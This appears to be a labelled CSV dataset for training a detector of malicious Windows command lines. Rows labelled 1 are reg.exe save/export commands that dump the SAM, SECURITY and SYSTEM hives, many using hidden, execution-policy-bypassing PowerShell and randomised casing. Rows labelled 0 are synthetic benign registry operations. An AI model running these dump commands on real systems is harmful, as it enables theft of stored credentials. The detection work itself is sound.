text,label
"powershell -c reg save ""hkey_local_machine\hkey_local_machine\software\policies\microsoft"" ""c:\windows\temp\software_dump.dat""",0
cmd.exe /c reg.exe  export hklm\security  \.\c$ackup.reg,1
pwsh -noprofile -c reg.exe  export  hkey_local_machine\sam \\localhost\c$\__dump\sam.bak,1
"reg.exe  delete  ""hkey_local_machine\software\policies\mycorp""  /v version",0
"POwerSHEll -c Reg.EXE CoPY ""hKu\soFTwaRe\myaPP\seTTinGs"" ""hkU\SOfTwAre\ClAsSEs_763""",0
"reg   compare   ""hkey_current_user\control panel\desktop""   ""hkey_current_user\system\currentcontrolset\services_157""",0
reG   SaVe hKEy_Local_maChiNE\SYsTem   C:\WINdOWS\TEmP\saM.savE,1
"CmD /c rEg   queRy   ""hku\hKEY_locAL_macHInE\sYstEM\CurrENtConTROLset\CoNtrOL""   /V LAStUpdate",0
poWERshElL -eXEC ByPaSs -W HIDdeN -c reG  expOrt  HKLm\Sam c:\usERS\PublIc\REgiStrY_eXPoRT.reg  /y,1
"REG DelEte ""Hkey_CuRRent_USER\SOFtwaRe\mIcrOSoFt\winDowS\currENTVERsiOn"" /V lasTuPDatE",0
"rEg.Exe   Add   ""HKeY_UsERS\sOfTwArE\MYApp\SETTINgS""   /v VersioN   /T rEg_DwORd",0
"reg.exe query ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control"" /v lastupdate",0
c:\windows\system32\cmd.exe /k reg.exe   save   hklm\security \.\c$ackup.reg,1
cMd.EXe /c reg  SAVe  hkEy_LOCAl_MAChiNe\SecURItY  C:\WiNDoWs\TeMp\sAM.sAve /y,1
"REG.eXE  deLEte  ""hKEy_CUrREnt_uSeR\hkEy_LOCAL_maCHiNE\SYSteM\CuRReNtcoNtRoLsET\CONtRoL\SuBKey68""  /f",0
"reg.Exe  AdD  ""hkEy_UsErS\ContRoL PANeL\dEskTOP""  /v verSiON  /t REG_DWorD  /d ""c:\ProGRaM fILeS\App""",0
"REg ReSToRE ""hkU\CONtRoL PaNEl\desKTop"" ""Hku\SOftwARe\GoogLE\CHROme_446""",0
"reg.EXE  cOPy  ""HKEY_loCAl_machiNe\SystEm\cURRenTcONTrOlseT\SErviceS""  ""HKey_LOcAL_maCHiNe\SofTWarE\mYapp\SeTTIngs_636""",0
"reg   restore   ""hkey_users\system\currentcontrolset\services\subkey35""   ""hkey_users\hkey_local_machine\software\policies\microsoft_128""",0
pOWErsHelL -Exec ByPASS -w HidDEn -c reG.eXe EXPorT HKlm\sysTEm   c:\tEMp\systEm.hiVE   /Y,1
"ReG.eXE   UnLoaD   ""hKEY_usErs\HKEy_lOcAl_maCHInE\soFTwARe\WOW6432node\subkEy15""   /F",0
"sTArt /b REg.exE unlOad ""HKCU\hKEy_loCal_mAChIne\sOftWare\WOw6432nOdE"" /V vErsION",0
"reg.exe   query   ""hkey_current_user\hkey_local_machine\system\currentcontrolset\control""",0
pOWeRshElL -commAnD ReG.ExE  eXPort   hKEy_LoCAL_MacHine\sAm   %Temp%\sec_bAckuP.dAt,1
POweRsHell -EXeC byPass -w hIdDEN -c rEg.EXE  EXporT hKEy_LoCaL_MachinE\systEM  %TeMP%\seC_BaCKup.dAt,1
"stArT /B ReG   delETe   ""HkU\SyStEm\cURrenTCOnTrOLSET\sERVICES""",0
cMD.eXe /C reg.EXe  eXpOrt  hkLM\sAm  \\lOCaLhoST\C$\__dUmP\saM.BAK /Y,1
"StArT /b Reg  RESTORe  ""hkEy_uSErs\CONTROL PAnel\DEsKToP""  ""HKey_Users\soFtWarE\micRoSOft\winDows\cuRReNtvErsiON_486""",0
reg.exe export  hkey_local_machine\security \\localhost\c$\__dump\sam.bak,1
c:\wINdowS\sYsTEM32\Cmd.eXE /K rEg.ExE  eXpORt HKLm\SYstem   \.\C$acKuP.ReG,1
c:\windows\system32\cmd.exe /k reg.exe  export   hkey_local_machine\sam  c:\temp\system.hive,1
"sTArT /b REG.Exe  QUEry  ""HkEy_CurrEnT_USER\soFtWaRe\MicRoSOFT\winDoWs\cURrENtVersIoN\SUBKEy66""  /V vERSiOn",0
"STaRT /b ReG.exe aDd ""hkU\hKeY_LOcAl_MACHINe\SySTEM\CUrrEnTCONTROLsET\ContrOl"" /V VersiON /t ReG_SZ /D ""1.0.0""",0
POWeRSHeLL -eXeC ByPasS -W hidDEn -C REg.exe  EXpORT  Hklm\SYStEm   \\lOCalhost\c$\__DUMp\sam.BAK /Y,1
powerSHElL -exec Bypass -w Hidden -C rEg  saVe  hKLM\sAm c:\useRs\PubliC\reGiStry_expoRT.REG   /Y,1
pwsh -noprofile -c reg.exe save  hkey_local_machine\security   c:\temp\system.hive   /y,1
cMd.EXe /C reg   export   HKey_LOCAL_MachIne\SAm  c:\TEMp\sYStem.hIve   /y,1
powershell -command reg.exe   export   hklm\sam   c:\temp\system.hive  /y,1
pwsh -noprofile -c reg.exe export   hklm\system   \\localhost\c$\__dump\sam.bak,1
"Reg.exe  COpy  ""hKcU\soFtwArE\MyaPP\SEttings""  ""hKCU\SoFtwARE\mYAPp\SETtiNgS_661""",0
"powershell -c reg.exe delete ""hkey_local_machine\software\microsoft\windows\currentversion\subkey23"" /v lastupdate",0
powershell -exec bypass -w hidden -c reg   save hkey_local_machine\sam  c:\users\public\registry_export.reg /y,1
PoWERSHElL -COmMaND REg.EXe  ExPorT hkey_LOcAL_maChIne\seCURitY  \\LoCAlHost\c$\__dUmp\Sam.BAK  /y,1
"PowersHELl -C Reg.ExE unlOAD ""hkeY_CUrrEnt_uSEr\sOfTWArE\POlICiES\MYcoRP\subkey69"" /V LAstUPdatE",0
cMd.EXE /C STArT /b REg.eXe  exPort HKlm\sYSTEM  \.\c$acKuP.rEG,1
"REG CopY ""HkEY_cUrReNt_usER\soFTWarE\pOLiciEs\MycOrP\subKey20"" ""hKey_cURrEnT_USER\sYSTEm\cUrreNTcontROLseT\SeRVICes_805""",0
c:\windows\system32\cmd.exe /k reg   save hklm\system   %temp%\sec_backup.dat,1
powershell -command reg.exe  export hkey_local_machine\security \\localhost\c$\__dump\sam.bak,1
"reg.exe   delete   ""hkey_current_user\software\classes""   /v path",0
cmd.Exe /C staRT /B reg.eXE   sAve HKLm\SECurItY C:\TeMP\sYSTem.hIve,1
"Reg   COMpARe   ""hKU\ENVIroNment""   ""hKU\sOFtWArE\clASSeS_352""",0
ReG.EXe eXport  HKLM\seCURiTY \.\c$ACkUP.reg,1
C:\WIndoWS\SYsteM32\CmD.ExE /K rEg.eXE  SaVE hkeY_LocaL_machINE\securiTY  c:\TEMp\SYSTeM.HIvE  /Y,1
"ReG   cOPy   ""HkeY_lOcAl_macHInE\ENVirONMENT""   ""HkeY_LOCal_maCHine\sOftWarE\MIcRoSOfT\wIndOWs\CurrenTversioN_881""",0
"REG CompaRE ""HkeY_CUrrENT_usEr\sOFtWARe\ClAsSES"" ""HKeY_curRent_usER\hKey_LocaL_MaCHInE\SOFTware\polICieS\mIcrosoFt_315""",0
CmD.eXe /C sTaRt /b REg   SaVE   hkEY_LOCAl_MAchInE\sAM   %Temp%\SeC_backUp.DAT   /Y,1
"sTARt /B REG.exE  coPy  ""HkU\cOnTRoL pANeL\dESktOP""  ""hkU\HKeY_loCAL_maCHIne\SoFTwaRe\WoW6432NoDE_732""",0
"reg.exe  copy  ""hku\software\microsoft\windows\currentversion\subkey95""  ""hku\hkey_local_machine\software\policies\microsoft_584""",0
"reG  coPY  ""hku\soFTWare\gOOGlE\ChROMe\SUBkEy29""  ""HKU\HkEy_LocaL_mACHINe\SOfTWARe\WOW6432node_502""",0
"reg.exe   save   ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control""   ""c:\windows\temp\software_dump.dat""   /y",0
PWSh -NOPrOfIlE -c REg SAve   Hklm\SAm  \.\C$acKUp.rEg /Y,1
CMd.Exe /c reG.Exe SAvE   Hklm\sECUrIty C:\tEmP\sYStEM.hIve,1
POWeRShEll -EXec BYpaSs -w HIddEN -c rEg  eXPORt   hkLM\SecUrity   %TemP%\SeC_bACkUP.DAt,1
"REG.EXE  CoPy  ""HKEy_CuRrENT_UsER\hkey_LoCAL_machiNE\softWaRE\wow6432noDe\SUBKeY39""  ""HkEy_CUrrent_USER\softwarE\miCroSoft\WINdoWS\cURreNtVersiOn_423""",0
pWsH -NOProfILE -C rEg   exPOrT hkey_LOCaL_mAchiNE\SAM  \.\c$AckUp.REg /Y,1
C:\wInDOWs\sySteM32\cmD.EXe /k reG.eXE SaVe  hKlm\sam c:\UsErS\pUBLic\regiSTrY_EXPOrT.reG  /Y,1
"reg   unload   ""hkcu\software\google\chrome\subkey35""   /v version",0
reG   savE  hKEy_lOcaL_MaCHiNE\Sam   c:\tEmP\SySTEM.hIvE /Y,1
reG.EXe   EXport hKlM\SAm  \\LOcAlhOSt\C$\__dUmP\saM.Bak,1
"rEG UNlOaD ""HKEy_CurrENT_UsEr\HkeY_LOcaL_mAChiNe\systEm\CUrrentcoNTROlsEt\conTRol"" /f",0
cMD.eXe /C STaRt /b Reg  exPoRT  hkEy_lOcAl_MAChInE\SecUrItY   c:\USERS\PubLic\ReGIstry_export.rEg   /Y,1
Pwsh -NOProfIle -c REG   sAVE  HKLM\sEcuRIty \\LoCaLHOsT\C$\__DUmP\SAM.baK,1
"powershell -c reg   query   ""hkey_current_user\software\google\chrome""   /v lastupdate",0
cmd.exe /c start /b reg  export   hkey_local_machine\security   c:\windows\temp\sam.save  /y,1
cMd.eXe /C StART /B rEg.eXE  saVe   HKLM\SYsTEM  C:\UserS\PUbLIc\regisTRy_ExPOrt.ReG,1
"reg.exe   add   ""hkey_local_machine\control panel\desktop""      /t reg_dword   /d ""1.0.0""",0
"REg.Exe   ADd   ""HKeY_loCAl_MaCHine\software\POLIcIEs\mycorP\suBKey69""   /F   /T REG_SZ",0
"REg.eXe   DEleTe   ""HkcU\softWaRe\mIcROsoFT\wInDOWs\CuRrENtVersioN""",0
PowErshELL -EXEc bYpAss -w HiDDEN -C REg.eXe   Save  HKEy_lOcaL_macHInE\SECuRIty   C:\WInDOWS\TeMP\SAm.saVE   /y,1
"reG.EXE dElEtE ""hkEY_uSeRS\sofTwARe\cLAssEs"" /V lASTuPDAte",0
rEG.Exe  EXPort   Hkey_LocaL_MACHIne\sAm  C:\WInDOWS\tEMp\sAM.SAVE,1
CmD.eXe /c Reg eXPOrT hklM\SEcURitY  \.\c$acKUP.Reg,1
"rEg  COPY  ""HKEy_loCal_MaCHINE\SOftwAre\GOoGLE\chRomE""  ""hKeY_LocAl_MAChINe\hkey_loCAL_mAcHIne\SOFtWARe\polICieS\MiCrOSofT_924""",0
cmd.exe /c reg.exe   export  hkey_local_machine\sam  %temp%\sec_backup.dat /y,1
"POwERSHELl -c reG  CopY  ""hKcU\hKEy_LocAL_mACHINE\sOFTwARE\wOw6432NODe\suBKeY56""  ""HkcU\enViROnMent_179""",0
"rEG  uNLoAd  ""HKCu\soFtWare\poLICieS\mycORp""",0
c:\windows\system32\cmd.exe /k reg save hkey_local_machine\system c:\temp\system.hive   /y,1
"rEg.ExE   uNLOAd   ""HkEY_lOCaL_MachinE\SoftwAre\mICRosoFT\winDoWS\CUrReNtVerSIon\subkeY28""   /v laSTuPdATe",0
powershell -command reg.exe   export   hkey_local_machine\security \\localhost\c$\__dump\sam.bak  /y,1
"Reg.eXe   resTore   ""hkCU\SOftwARe\GoOGlE\CHroME""   ""HKCU\eNVIRoNMENT_754""",0
"reg  quEry  ""hkEY_UsErS\HkeY_locAL_MAchINe\soFTWAre\wOw6432node""  /v VERSion",0
powershell -exec bypass -w hidden -c reg export hkey_local_machine\security  \.\c$ackup.reg   /y,1
PwSH -NOprOFile -c reg.exE   saVe   HKey_loCAl_mAcHiNE\SaM \.\C$acKuP.Reg   /Y,1
CMD.Exe /c rEG.exe   eXpORT   hkEy_LocaL_MACHiNE\SEcURitY \\loCalhOsT\c$\__dUMP\SAM.BAk  /Y,1
"rEG.eXE   REStORe   ""hkEY_LoCAl_maChINe\hKey_LOcaL_machINe\softWARE\WoW6432NoDE""   ""hKEY_locAL_mAChInE\softWaRE\mYApP\settIngS_366""",0
"cMD /c rEG.exE   COMPArE   ""hkCU\sYSTem\cUrrENtConTrOLSEt\ServicES""   ""HkcU\SySTEM\CuRrEnTCoNTRolsEt\SeRvicEs_860""",0
cmd.exe /c reg.exe save   hkey_local_machine\system  %temp%\sec_backup.dat,1
pOWERsHell -ExeC bypAsS -W HIDDEn -c Reg   sAve  HkEY_lOcaL_MAcHiNe\sECurItY C:\WINdowS\temP\sAm.sAVE,1
pwsh -noprofile -c reg   export hklm\security  c:\users\public\registry_export.reg,1
"ReG.ExE CoMpArE ""hkeY_USeRS\cOntROl PanEl\DeSkToP\SuBkEY53"" ""hkeY_usErS\CONTrOl PANEl\deSkTop_296""",0
"CmD /c reg.exE   reStORE   ""hkeY_LoCAl_mAChiNE\SoftwArE\GOOgle\ChROME\subKey34""   ""hkeY_loCal_mAchINE\SOfTwArE\mYApp\SEttings_783""",0
"cMd /C poWeRSheLL -c ""reg.exe   EXPOrt  HklM\SySTeM  C:\uSErs\PuBlIc\ReGIstrY_EXPOrt.rEG /Y""",1
reg   save  hkey_local_machine\system   c:\windows\temp\sam.save  /y,1
"powershell -c reg.exe   save   ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey87""   ""c:\users\public\chrome_data.bak""",0
"Reg.Exe  SaVe  ""hkEY_LoCAL_MACHiNE\hKey_lOcAl_MaChinE\sOFtwaRE\woW6432NoDE""  ""c:\wInDOwS\tEmP\SOfTWARe_duMP.DAT""  /Y",0
"powErshELl -c reG.exe uNLOad ""HkEY_CURREnt_user\HKEY_LOcAL_mAChiNe\sofTwAre\pOliCIeS\MicrosoFt""",0
ReG.exe expORT   HKlM\SaM \\locaLhOSt\C$\__dump\SaM.bak,1
c:\windows\system32\cmd.exe /k reg  save hklm\sam  c:\users\public\registry_export.reg  /y,1
reg   SaVE  HkEy_lOCAL_mAcHiNE\systEm   %teMP%\SEc_BACKUp.dAT,1
"reg query ""hkey_current_user\hkey_local_machine\software\wow6432node\subkey22"" /f",0
cmd.exe /c reg.exe export   hklm\system c:\users\public\registry_export.reg  /y,1
"cMd /C POWERsheLl -c ""Reg.exE   exPorT  hklm\securITY   c:\Temp\SySTem.HivE  /y""",1
"reg.exe   compare   ""hkcu\environment""   ""hkcu\hkey_local_machine\software\policies\microsoft_991""",0
C:\WIndowS\syStEm32\Cmd.EXE /k rEg.exe savE  HKlM\Sam c:\TEmP\sYSTem.hivE /y,1
"reg.exe delete ""hku\software\microsoft\windows\currentversion\subkey85""",0
Cmd.eXe /c reg  saVe  hklM\sYsTEm   \\locaLhOsT\C$\__DuMp\sAM.BAK   /Y,1
powERsheLl -cOmmAND reG.eXe  sAVE   hkEY_lOCAL_mAChiNe\saM  \.\C$acKup.Reg,1
"POWErShELL -c rEG.ExE  SAVe  ""HKEy_LOCAl_MachiNe\HkEY_lOCaL_mAchinE\SysTem\cUrrentCONtROlseT\control""  ""C:\WiNDoWS\TEMP\soFTWAre_dUmP.DAT""",0
POWERSHeLL -ExEc BypASS -W HiDDEN -C rEG sAvE hKey_loCaL_MacHIne\SYSTeM  C:\useRs\PUBLIc\rEGistRy_eXPoRt.REG   /y,1
REG exPort hklm\syStem   c:\WiNDowS\TEmp\sam.sAVE /Y,1
CMd.eXe /c reG eXpoRt   HKlm\SaM   C:\usErs\pUBlIc\rEGistry_eXPOrT.Reg /Y,1
"cMd /C powERSHeLL -c ""reG  SAVE   HKEy_locAl_MaChinE\SAm c:\usErS\puBlic\rEGiStRy_eXpoRT.reg  /y""",1
"cmd /c powershell -c ""reg   save hklm\sam c:\windows\temp\sam.save /y""",1
"starT /B rEG   AdD   ""HkeY_loCAl_machINe\ContROL PaNel\desKTop""   /v lASTupdATe   /T Reg_sZ   /d ""C:\PROgRAM FILEs\aPp""",0
pOWershELl -EXec byPaSS -w hiDDEN -c REg  eXPOrT   hKey_lOCAl_macHine\SysTEM  %temp%\sec_bACKUP.DAt,1
"reg.exe   DeLeTE   ""hKcU\eNvIRonmeNt\sUbKey32""   /v lAstupDATe",0
"POWErshELl -C REg.Exe   deLETE   ""HKU\Hkey_locAL_machiNe\softWArE\WOW6432noDe""   /F",0
reg.exe   export   hkey_local_machine\system   c:\users\public\registry_export.reg /y,1
pOweRShELl -ExEc bYpASS -W HIDDeN -c REG eXpoRt   HKLM\securItY  \\lOCALHoSt\c$\__DUMp\saM.Bak /y,1
"reG.EXE COPy ""hKcU\SySTEm\CUrReNtCOnTroLSET\SERvICES"" ""HkCU\hKey_LocaL_mAchiNE\SySTEM\cURRenTCONTRoLseT\conTRoL_955""",0
POwerShELl -exEc byPASS -W HiddeN -C rEg.ExE   eXporT HkEY_locAL_MachIne\SYstEM   \\lOCaLhost\C$\__DumP\Sam.BAK   /Y,1
pwsh -noprofile -c reg.exe save  hklm\sam  c:\temp\system.hive   /y,1
PoWErShElL -CommaNd ReG.EXe   SAvE hkEy_lOcAL_mAchiNe\sAm   \\LocALhost\c$\__duMp\sAm.bAk,1
"POWErsHeLL -c Reg.EXe   Add   ""Hkey_LOCAl_MAchInE\SoFTWARE\CLAssES""   /V veRsioN   /T rEG_sZ   /d ""1.0.0""",0
wmic.exe,0
PoWeRSHElL -coMMAND reg expORT  hKEy_loCaL_MaCHiNe\SYStEM  C:\wINDOwS\TemP\Sam.save /y,1
"reg   query   ""hkcu\software\microsoft\windows\currentversion""",0
"CMd /C REg.ExE DEletE ""HKEy_CUrReNT_UsER\SystEm\CurREntcontRoLset\SERvIceS\SubkEY84"" /v paTh",0
cMd.ExE /C rEG.eXE  saVe   hkEY_LOcal_mACHINE\SaM C:\usERS\pUblIc\ReGIstrY_exPoRT.reG /y,1
"cMD /c REg.exe   COMpaRE   ""HKU\soFTwARE\myaPP\SetTIngs""   ""hkU\sOFtWaRE\poLICIEs\mYcORp_673""",0
"Start /B rEg.Exe  DeLeTE  ""HKcU\Software\classES\SUbKEy33""",0
"CMD /c poWersHeLL -c ""reG.EXe sAVe   hKEy_LOcaL_maCHiNe\sYstem C:\tEMp\sysTem.hiVE""",1
"REg.eXe  UNlOaD  ""hkcu\SYstEM\CURreNtCoNtRoLsEt\seRvIces""",0
C:\windowS\syStem32\cmd.exe /K REg   Save  HKEY_lOCaL_mAcHINE\sySTeM c:\wINdOWS\temp\sam.SavE /y,1
"rEG  rESTore  ""hKey_usErS\cOntrOL pAnEl\dEsktoP\subkEY37""  ""hKEy_uSeRS\SoFtWArE\mYaPP\sEtTinGS_397""",0
powershell -command reg   export hklm\system   %temp%\sec_backup.dat   /y,1
reg export hkey_local_machine\sam  c:\windows\temp\sam.save,1
"reg.exe  restore  ""hkey_current_user\software\classes""  ""hkey_current_user\software\classes_479""",0
c:\WINDoWS\sySTeM32\CMD.eXE /k Reg.EXE  EXPORt   HKlm\SYSTem   %Temp%\sec_BackUP.dat,1
"reg   copy   ""hku\hkey_local_machine\system\currentcontrolset\control\subkey85""   ""hku\system\currentcontrolset\services_572""",0
"cmd /c powershell -c ""reg   save hklm\security %temp%\sec_backup.dat""",1
rEG   EXPOrT  hKLm\sYSTEM C:\USeRs\puBLIc\rEgIStRy_EXPOrT.REg,1
pOWershELL -EXEC bypASs -W hiDdEN -C reG SAvE   hKey_LOCAL_MACHInE\SecuRITy   \.\C$aCKUP.Reg,1
"rEG.eXE  comPaRe  ""Hku\hKEY_LocAl_MAcHine\SYSTEm\CurrenTCOnTROlSet\cOnTROl""  ""hku\HkEy_loCAL_MAChInE\sofTWARe\pOLICieS\MIcROsoFt_355""",0
"cmD /c POwERsHeLL -C ""ReG  sAVE   hKey_loCal_mAChiNe\sySTeM   \.\C$ackUP.REG""",1
"ReG  uNlOad  ""HKU\sOFTWaRE\pOLicIes\MYCORp\suBkey32""  /V vErSion",0
"staRT /B rEG.exe   adD   ""hKcU\SoFtwArE\pOliCIEs\mYcorp""   /V LASTUpdaTe",0
"start /b reg query ""hkey_local_machine\software\myapp\settings"" /f",0
cmd.exe /c start /b reg.exe  save   hklm\security   \\localhost\c$\__dump\sam.bak   /y,1
"REg.EXE  REStORE  ""hkeY_USeRS\hKeY_LoCaL_mACHInE\SysTEm\currENTcOnTrolset\CONTRoL\SUbKeY93""  ""hkey_uSERs\SOfTwarE\clASses_459""",0
"Reg  QuErY  ""Hkcu\SOftWarE\gOOgLE\chrome""",0
"rEg aDd ""hKey_LocaL_MAChINE\envIrONMeNt"" /v paTH /T reG_sz /d ""1.0.0""",0
"reg  adD  ""HKU\HkEy_LocAl_machINE\SOFtwaRE\PoLIciES\MiCRoSofT""  /v pATh  /T reG_sz  /D ""1.0.0""",0
powershell -exec bypass -w hidden -c reg.exe   save   hklm\security  %temp%\sec_backup.dat /y,1
"pOWersHelL -C reG  unloAd  ""HKEY_CurrEnT_uSeR\SOftWaRe\mYaPp\SETTiNGs""",0
"powershelL -c Reg.exE DelEtE ""HkEy_CUrrent_User\hKeY_lOcaL_mAChine\sYSTeM\CURRenTconTrOlsET\conTrOL"" /v lasTupdatE",0
c:\windows\system32\cmd.exe /k reg export   hklm\sam c:\users\public\registry_export.reg,1
"Cmd /c REG.EXE  UnlOAD  ""HKEy_UsErS\ENViroNMeNT\SUbKEy45""  /V paTh",0
ReG.eXe  ExPorT hkEy_loCAl_MAcHine\seCuRITy  %TemP%\seC_BacKUP.dat,1
"cmd /c reg restore ""hkey_current_user\hkey_local_machine\software\wow6432node\subkey11"" ""hkey_current_user\software\myapp\settings_927""",0
cmd.exe /c start /b reg.exe  save   hklm\sam   c:\temp\system.hive  /y,1
"cmd /c reg.exe copy ""hkey_users\system\currentcontrolset\services"" ""hkey_users\software\microsoft\windows\currentversion_518""",0
"ReG.Exe rEStOrE ""HkEY_USERs\eNviRONMeNT"" ""hkey_userS\sOFtWaRE\mIcROSOft\WINDowS\CurREntverSioN_705""",0
"PoWERSHelL -c REG.eXE   copy   ""Hkey_uSeRS\SOFtWARE\micROsOft\WIndOwS\CUrrEntveRSIon""   ""hKEY_usErs\enviROnMEnT_542""",0
cmd.exe /c start /b reg.exe  export hkey_local_machine\system  \.\c$ackup.reg,1
"Reg.eXE   CoMpare   ""hKCU\sYSTEM\curRENTcONTROlSet\sERVICeS\sUBKEy9""   ""hkcu\HkEy_loCAl_macHinE\sYSTem\curRENtcONtroLSET\conTroL_237""",0
"powerShElL -C ReG.EXE DeLEte ""hKey_lOcAl_mAchIne\hkEy_lOCal_mAChInE\sofTwAre\woW6432NOde"" /F",0
CMD.ExE /c StaRt /B REg  eXPORT   HkeY_LOcal_mAChiNe\SyStem  C:\WINdowS\TeMP\SaM.SaVe   /y,1
REG.exE  SAvE   HkeY_local_mAcHine\SAm c:\uSERs\PubLiC\regISTrY_ExPort.rEg,1
"reg   save   ""hkey_local_machine\hkey_local_machine\software\wow6432node""   ""%temp%\non_sensitive.hive""   /y",0
"reg.exe  save  ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey22""  ""c:\users\public\chrome_data.bak""",0
cMD.exE /C sTarT /b rEg   EXporT   HKEy_LOcAL_MaChInE\SECuRity C:\usErs\PUBLiC\RegisTrY_EXPORt.reg,1
"reg  compare  ""hkcu\environment""  ""hkcu\system\currentcontrolset\services_505""",0
"cmd /c reg query ""hkcu\environment""",0
poWErshELL -cOmmaND rEG.eXe saVE hkey_LoCAL_MachINe\sAm   c:\WIndowS\Temp\sam.save,1
"cMd /c rEg sAVE ""hKEy_LOcAL_MaChine\hKEY_lOCaL_MaCHINe\sofTwaRe\pOLICiES\MICRoSOft\subkeY85"" ""C:\USErs\PuBLic\CHRoME_DATa.bak"" /y",0
"rEg CoPY ""HKu\HkEY_LOCAl_maChine\SoFtwAre\WoW6432NOde\SUbkey96"" ""hku\soFtWare\mYaPP\settINGs_459""",0
"reg.exe  copy  ""hkey_users\hkey_local_machine\software\policies\microsoft""  ""hkey_users\software\google\chrome_280""",0
REG.EXE  SaVE HKlM\saM  \.\c$ackUp.Reg,1
"rEG.EXe  sAVE  ""HkeY_LoCaL_mACHInE\hKEy_loCAL_machinE\soFtwARE\PoLiCIES\MICROSoft\subKeY76""  ""C:\tEmP\uSeR_Settings.rEg""  /y",0
cMd.exe /c Start /B ReG.eXe savE  hklM\Sam   C:\wIndowS\TeMp\sam.SaVe   /y,1
POwerSHEll -EXEC byPASs -W hiDDEN -C reG.exe saVE  HKey_LOcal_MAcHInE\sAm \.\C$AckUp.REg,1
PowerSheLl -COMmAnD Reg.ExE  SAve hkEY_LOCAl_MachiNe\saM  c:\USErs\PubliC\ReGIStrY_eXPORt.ReG   /y,1
"rEg   REstORe   ""HkEy_CURrenT_uSEr\HKEy_loCaL_MACHiNe\SYsTeM\cuRrenTCoNtrOLSEt\cONtrOL\subKEY60""   ""HKey_CUrRENt_UsEr\SOftwaRE\clASSEs_623""",0
"Reg.ExE   compare   ""Hku\sOftWare\MicrOsOFT\wiNDOwS\CURRENtVerSIOn\SuBKey20""   ""HkU\SoFTwaRE\POLICIES\mYCOrp_432""",0
C:\Windows\sYStEm32\Cmd.EXe /k rEG.exE SAVe   HkeY_LocAl_maCHiNE\SecuRITy  %TemP%\sec_bACKUp.dAt   /Y,1
PwsH -NoPrOFiLE -C REG ExPOrT HkLM\sYStEm  c:\Users\PubLiC\ReGIStrY_exPORt.Reg,1
"StArt /B REg dELetE ""HKEY_CURReNT_usER\sySTEM\cUrrentContrOLSEt\serViCES"" /V vERSiOn",0
"reg.exe   compare   ""hku\hkey_local_machine\software\policies\microsoft\subkey24""   ""hku\software\classes_760""",0
powErSheLL -CommAND reG.exe   SAvE hKLM\sam %TeMP%\SEC_BACkup.daT   /Y,1
"rEG  QUErY  ""HKcu\hKeY_lOcaL_MacHINE\SOFtWaRe\WOW6432NoDE""  /V VeRSIOn",0
powerSHELl -exEC BYpAsS -W hiDden -c rEG  EXpoRt  hkLm\SECurITY   %Temp%\sEc_BACKup.DAt /y,1
PoweRsHelL -cOmMaND rEg  sAVE  hKLm\SYSteM  %tEmP%\Sec_BaCKup.DAT,1
"pOwERShelL -C REG coPY ""Hkey_locAL_MacHine\Hkey_LOcal_mACHInE\soFtWARe\wOW6432noDe"" ""hkEy_LOCAL_MAChINE\HKEy_local_MAChiNe\sysTEM\CuRreNTcontRoLSET\cOntRoL_207""",0
"powershell -c reg.exe  delete  ""hkcu\software\myapp\settings\subkey84""",0
pwsh -noprofile -c reg.exe   save   hklm\security  %temp%\sec_backup.dat,1
C:\windowS\SySTEM32\Cmd.EXE /k rEg   saVE HkLm\SECUrity \\lOCALhost\c$\__DUmp\SAm.Bak  /Y,1
cmd.eXE /C STArt /B reg  sAvE  hkLm\sEcUrITy C:\Temp\sysTem.HIVE /Y,1
reg.exe   export hklm\system c:\temp\system.hive  /y,1
"reg.exe  add  ""hku\software\policies\mycorp\subkey43""  /v version  /t reg_dword  /d ""c:\program files\app""",0
"cmd /c reg.exe  compare  ""hkcu\hkey_local_machine\software\wow6432node\subkey36""  ""hkcu\system\currentcontrolset\services_805""",0
cmd.exe /c start /b reg.exe export  hkey_local_machine\system   \.\c$ackup.reg,1
pOWersHelL -exec bypASS -w hiDdEn -C rEg   eXpOrT   HKlM\sysTEM   \\LocaLhost\C$\__DUmP\saM.bAk  /y,1
POWeRshElL -EXEc BypASs -W HidDeN -c reg   SaVe   HKEy_locAl_MACHiNE\seCUrIty  c:\UsERs\PuBlIC\rEGISTRy_expOrt.rEG   /Y,1
"reg.exe unload ""hkey_users\software\microsoft\windows\currentversion"" /f",0
pWSh -noprofile -C REg  ExpOrt  HKEy_Local_MAchINE\SysteM  \\locALHoSt\c$\__DuMP\SAm.BaK,1
